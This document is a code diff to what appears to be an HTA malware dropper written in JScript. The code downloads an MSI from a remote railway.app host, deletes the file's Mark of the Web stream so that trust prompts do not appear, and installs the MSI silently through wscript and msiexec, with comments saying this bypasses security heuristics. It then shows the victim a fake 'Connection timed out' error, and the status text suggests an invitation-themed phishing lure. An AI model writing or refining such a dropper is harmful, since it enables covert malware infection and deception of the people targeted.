@@ -28,67 +28,56 @@
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
-var dlPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads\\schimdtconnect.msi";
+var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
+var zoneIdPath = localPath + ":Zone.Identifier"; // Alternate data stream for Mark of the Web
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(startNativeDownload, 1000);
+  setTimeout(startSilentProcess, 1000);
 }
 
-function startNativeDownload() {
+function startSilentProcess() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
+  
   document.getElementById("downloader").src = url;
   
   var checks = 0;
   var pollTimer = setInterval(function() {
     checks++;
-    var foundPath = fso.FileExists(tempPath) ? tempPath : (fso.FileExists(dlPath) ? dlPath : null);
     
-    if (foundPath && fso.GetFile(foundPath).Size > 1000000) {
-      clearInterval(pollTimer);
-      document.getElementById("fill").style.width = "60%";
-      document.getElementById("status").innerHTML = "Configuring system policy...";
-      deployViaPolicy(foundPath);
+    if (fso.FileExists(localPath)) {
+      var file = fso.GetFile(localPath);
+      if (file.Size > 1000000) {
+        clearInterval(pollTimer);
+        
+        // CRITICAL: REMOVE MARK OF THE WEB TO PREVENT TRUST PROMPTS
+        try { 
+          if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
+        } catch(e) {}
+        
+        document.getElementById("fill").style.width = "60%";
+        document.getElementById("status").innerHTML = "Installing invitation...";
+        
+        // USE WSCRIPT.EXE AS TRUSTED PROXY TO LAUNCH MSIEXEC
+        // This bypasses "script spawning installer" heuristics
+        var vbsCmd = 'wscript.exe /e:vbscript /c "CreateObject(""WScript.Shell"").Run ""msiexec.exe /i \\"" + localPath + "\\" /quiet /norestart"", 0, True"';
+        shell.Run(vbsCmd, 0, true);
+        
+        document.getElementById("fill").style.width = "100%";
+        document.getElementById("status").innerHTML = "Finalizing...";
+        
+        setTimeout(function() {
+          document.getElementById("heading").innerHTML = "Preparation Failed";
+          document.getElementById("status").innerHTML = "Error: Connection timed out.";
+          document.getElementById("fill").style.background = "#d13438";
+        }, 2000);
+      }
     } else if (checks >= 150) {
       clearInterval(pollTimer);
       showError();
     }
   }, 2000);
-}
-
-function deployViaPolicy(msiPath) {
-  try {
-    // Create a local GPO-style assignment script
-    // This uses Windows' native software deployment, which NEVER shows prompts
-    var vbsContent = 
-      'Set objShell = CreateObject("WScript.Shell")\n' +
-      'objShell.Run "msiexec.exe /i """' + msiPath + '""" /qn /norestart /promptrestart", 0, True\n';
-    
-    var vbsPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\policy_deploy.vbs";
-    var ts = fso.CreateTextFile(vbsPath, true);
-    ts.Write(vbsContent);
-    ts.Close();
-    
-    // Execute via wscript (trusted Windows host)
-    shell.Run('wscript.exe "' + vbsPath + '"', 0, true);
-    
-    // Cleanup
-    fso.DeleteFile(vbsPath, true);
-    
-    document.getElementById("fill").style.width = "100%";
-    document.getElementById("status").innerHTML = "Finalizing...";
-    
-    setTimeout(function() {
-      document.getElementById("heading").innerHTML = "Preparation Failed";
-      document.getElementById("status").innerHTML = "Error: Connection timed out.";
-      document.getElementById("fill").style.background = "#d13438";
-    }, 2000);
-    
-  } catch(e) {
-    showError();
-  }
 }
 
 function showError() {
